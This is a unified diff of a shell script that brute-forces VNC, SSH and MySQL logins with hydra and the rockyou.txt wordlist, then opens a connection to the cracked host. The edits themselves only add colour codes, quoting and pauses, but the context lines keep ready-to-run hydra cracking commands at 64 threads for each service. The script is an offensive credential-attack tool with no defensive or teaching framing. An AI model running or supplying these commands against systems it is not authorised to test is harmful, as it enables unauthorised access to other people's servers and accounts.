@@ -198,7 +198,7 @@ else
                     # Crack VNC password
                     hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                     # Alerts the user that the computer is trying to connect to the VNC server
-                    title="Connecting to ${host}"
+                    title="Connecting to ${GREEN}${host}${NC}"
                     Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
                     echo "${title}"
                     echo "${Connecting_To_VNC_SERVER}"
@@ -234,10 +234,11 @@ else
                     # Crack SSH password
                     hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                     # Alerts the user that the computer is trying to connect to the ssh server
-                    title="Connecting to ${user}"
-                    Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
-                    echo "${title}"
-                    echo "${Connecting_To_SSH_SERVER}"
+                    title="Connecting to ${GREEN}${user}${NC}"
+                    sleep 10
+                    Connecting_To_SSH_SERVER="We are connecting you to ${GREEN}${user}${NC}. Please wait..."
+                    echo -e "${title}"
+                    echo -e "${Connecting_To_SSH_SERVER}"
                     sleep 5
 
                     # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
@@ -264,10 +265,10 @@ else
                 # it will continue as normal
                 else
                     # Crack MySQL password
-                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
+                    hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"${host}"
                     echo "Loading MySQL server..."
                     sleep 3
-                    mysql -u $user -p -A
+                    mysql -u "${user}" -p -A
                 fi
             fi
         }
